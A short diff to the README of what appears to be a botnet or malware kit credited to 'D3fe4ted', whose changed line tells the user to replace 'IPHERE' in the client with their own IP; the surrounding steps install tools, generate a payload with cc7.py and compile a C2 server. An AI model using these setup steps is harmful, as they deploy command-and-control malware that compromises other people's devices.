@@ -15,7 +15,7 @@
    |__|                               by D3fe4ted
 
 1. sudo apt install python screen gcc nano perl
-2. go to client and change (ip)
+2. go to client and replace all "IPHERE"'s to your IP
 3. python2 cc7.py client.c (ip)
 4. Save your payload
 5. gcc server.c -o server -pthread
